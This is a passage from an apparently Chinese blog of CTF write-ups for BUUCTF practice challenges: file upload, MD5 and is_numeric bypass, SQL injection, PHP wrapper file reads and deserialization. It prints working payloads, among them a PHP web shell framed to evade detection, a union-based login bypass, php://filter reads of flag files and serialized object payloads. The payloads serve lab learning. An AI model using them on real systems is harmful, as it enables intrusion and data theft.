<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[shell]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">//不使用</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">eva</span>(<span class="variable">$_REQUEST</span>[shell])<span class="meta">?&gt;</span></span><span class="language-xml">，因为防一手检测。</span></span><br></pre></td></tr></table></figure>
<p>随后直接上传，成功。<br><img src="https://pic.imgdb.cn/item/6564075fc458853aef10e0a2.jpg"><br><code>4、webshell管理工具连接</code><br>访问的网址应该是：<br><a href="http://c95ecc9c-8102-4d9d-ba7d-f558ae384843.node4.buuoj.cn:81/upload/cfdfb305e6a0a106262f15d58e1f6b9a/shell.png">http://c95ecc9c-8102-4d9d-ba7d-f558ae384843.node4.buuoj.cn:81/upload/cfdfb305e6a0a106262f15d58e1f6b9a/shell.png</a><br>即去掉&#x2F;var&#x2F;www&#x2F;html&#x2F;<br>成功找到flag<br><img src="https://pic.imgdb.cn/item/6564076ac458853aef10fc72.jpg"></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><code>关键</code>：1、MD5绕过<br>      2、is_numeric()绕过<br>开启靶机，直接查看源码即可。<br><img src="https://pic.imgdb.cn/item/65642debc458853aef79ccdc.jpg"><br><code>2、代码审计</code><br>简而言之就两处比较重要：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br></pre></td></tr></table></figure>
<p> 注意这里是&#x3D;&#x3D;&#x3D;强等于，可以将参数设置为数组进行绕过；<code>如果是双等号弱等于，可以找两个md5加密后开头都是0e（这样就会被认为是科学计数法）的参数进行绕过</code><br>第一处：<br>在网址栏填入?id[]&#x3D;1&amp;gg[]&#x3D;2</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if (!is_numeric($passwd))</span><br></pre></td></tr></table></figure>
<p>第二处：<br>3种方法绕过。<br>法一数组加16进制绕过：<br>passwd[]&#x3D;12D687（1234567的16进制）<br>法二%00与%20截断：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。<br>passwd&#x3D;1234567%00（%20也可）<br>法三：passwd&#x3D;1234567a<br>最终：post提交：passwd&#x3D;1234567%20<br><code>3、斩</code><br>根据上述分析，最终填入<br><img src="https://pic.imgdb.cn/item/65642df7c458853aef79f50b.jpg"><br>直接爆出flag。<br><code>参考</code><br><a href="https://blog.csdn.net/weixin_50597969/article/details/115492810">https://blog.csdn.net/weixin_50597969/article/details/115492810</a></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>打开靶机，标准的登录界面。<br><code>首先测试是否存在注入点</code><br>ps：在用户名|密码输入都可，个人习惯在密码框输入。<br>输入1，密码随便输入<br>提示不存在这个用户<br><img src="https://pic.imgdb.cn/item/65694707c458853aefbd63e4.jpg"><br>输入1’，密码随便输入<br>直接报错，说明输入的’带入到数据库查询，存在注入点，且是字符型注入<br><img src="https://pic.imgdb.cn/item/65694720c458853aefbd99e2.jpg"><br><code>接下来尝试万能密码</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<p>应该是对or存在过滤，这里双写绕过也行不通，过滤做得挺好的。<br><img src="https://pic.imgdb.cn/item/6569472cc458853aefbdb557.jpg"><br>既然对or存在过滤，那么报错盲注应该也不行。<br><code>然后尝试堆叠注入</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;<span class="function">show <span class="title">database</span>()</span>;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>但是dabtabse()又被过滤了。<br><code>盲猜</code><br><code>然后我就不断尝试，发现select，union没被过滤</code><br>那我就先爆一下字段数</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6569473bc458853aefbdd55a.jpg"></p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65694751c458853aefbe040d.jpg"><br>那么可以确定字段数为3。<br>测试3个字段时，提示用户不对，那么猜测3个字段中有一个是select username，一个select password。<br>继续测试，看看具体是哪一个，这里有点跳跃，因为我直接猜username是admin。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6569475bc458853aefbe1bda.jpg"><br>测试出第二个字段是username。<br><code>关键-联合注入添加临时用户</code><br><code>利用sqli的特性：当union联合查询不存在的数据时，联合查询就会构造一个虚拟的数据</code><br>那么我在密码输入1<br>那么，payload如下（下面那一长串为1的md5值）<br><img src="https://pic.imgdb.cn/item/65694766c458853aefbe3734.jpg"></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p><code>ps：密码的字段靠试，1的位置没有爆出那么就尝试3的位置。</code></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">我的理解是：执行以上<span class="keyword">sql</span>语句时，在查询的时候并没有在数据库中匹配到（因为username虽然匹配了，但是<span class="keyword">password</span>仍没有匹配），那么<span class="keyword">union</span>就会创造一个临时的数据，也就在数据库中临时加上了：<span class="string">&#x27;admin&#x27;</span> <span class="string">&#x27;1&#x27;</span>，然后我密码输入<span class="number">1</span>，刚好匹配。</span><br></pre></td></tr></table></figure>
<p>直接爆出flag。<br><code>题外话：当字段在中间时，要用括号括起来，且用select（也就是把新查询的结果当作这段sql语句的第二个字段值显示出来）</code></p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;web&#x27;</span>),<span class="number">3</span><span class="meta">#</span></span><br><span class="line">table_schema!!!</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><code>这道题没啥好说的，但给了我一个警示：MIME类型不能仅仅局限于修改为image/png更要眼观六路，不行就换成jpeg的，试完全部才不会遗漏</code></p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>开启靶机，直接是一段php代码。<br>直接代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];		</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;  <span class="comment">// file_get_contents()把 $text 的文件中内容读入一个字符串中。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;		<span class="comment">// 正则过滤 $file 参数中不能有 flag </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php		</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);	<span class="comment">// php 反序列化</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><code>主要是三层过滤</code><br><code>第一层--利用php伪协议data://text/plain绕过</code></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(isset(<span class="variable">$text</span>)</span></span>&amp;&amp;(<span class="built_in">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))<span class="comment">// file_get_contents()把 $text 的文件中内容读入一个字符串中。</span></span><br></pre></td></tr></table></figure>
<p>file_get_contents($text,’r’)是读取文件的内容，说明我们首先要上传一个文件，并且它的内容还得是”welcome to the zjctf”，我们考虑用data协议，data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中的逗号后面然后让file_get_contents函数取读取。<br>payload</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain,welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br><span class="line">或</span><br><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;base64,(welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf)的base64</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/657860c0c458853aef6f7c1b.jpg"><br>成功绕过第一层。<br>ps：其实使用php:&#x2F;&#x2F;input也可以实现绕过</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">POST /?<span class="built_in">text</span>=php:<span class="comment">//input</span></span><br><span class="line">xxxx</span><br></pre></td></tr></table></figure>
<p>但是只支持post，这里是get，所以使用data:&#x2F;&#x2F;text&#x2F;plain。<br><code>第二层--利用php://filter先读取关键文件</code><br>由于对flag存在正则过滤，不能直接通过获取flag来拿到结果，不过可以用 php:&#x2F;&#x2F;filter 过滤器来进行绕过，先获取 unseless.php 的文件base64编码后的数据。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;		<span class="regexp">//</span> 正则过滤 <span class="variable">$file</span> 参数中不能有 flag </span><br><span class="line">     echo <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">     <span class="keyword">exit</span>(); </span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php，这里就提示可以使用php:<span class="regexp">//</span>filter读取文件包含的这个文件		</span><br><span class="line">     <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);	<span class="regexp">//</span> php 反序列化</span><br><span class="line">     echo <span class="variable">$password</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?text=data:<span class="regexp">//</span>text<span class="regexp">/plain,welcome to the zjctf&amp;file=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<p>base64解码后得到如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p><code>第三层--php反序列化</code><br>我把读取后的代码整合到一起就是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);	<span class="comment">// php 反序列化</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure>
<p>也就是说，有一个flag.php需要我们使用上述代码的函数进行读取，怎么读取呢？看到反序列化，那可以先序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$flag</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终payload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain,welcome <span class="keyword">to</span> the zjctf&amp;file=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>获取flag。<br><img src="https://pic.imgdb.cn/item/657860cfc458853aef6fcc42.jpg"></p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>直接代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//文件包含flag.php,这里后期看看可不可用使用php://filter读取</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;<span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;<span class="comment">//三个属性</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//创造类时调用，如果没有指定参数，默认使用此处的参数</span></span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;<span class="comment">//判断op的值，为1进入write();为2进入read();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;<span class="comment">//向某一个目录写入</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;<span class="comment">//读取文件，可以使用php://filter协议读取</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//简单输出</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//析构函数，这里是强比较，容易绕过</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//判断每一个字符的ASCII值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体代码分析已经注释。<br>细看代码，细细分析之后其实并不难，主要是几个细节要注意。<br><code>1、is_valid()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//判断每一个字符的ASCII值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>is_valid()： 要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。<br>绕过方法： 因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。<br><code>2、强比较类型===</code></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;<span class="comment">//析构函数，这里是强比较，容易绕过</span></span><br><span class="line">      <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">          $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;process();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这类型的比较连类型不同也比较，那我可以传入数字型的2实现绕过。<br>所以构造生成序列化payload函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<span class="comment">//利用文件包含</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="number">1</span>;<span class="comment">//随意</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>填入序列化payload</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">str</span>=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>读取到flag<br><img src="https://pic.imgdb.cn/item/65786f5ec458853aefb31bd8.jpg"></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>题目处看到存在源代码<br>我是经过上传测试后，发现双写，改后缀，传配置文件等都上传失败，而且想利用图片马的，但是没有存在文件包含漏洞，不知道有没有解析漏洞。<br>然后看源码的过滤规则吧。</p>
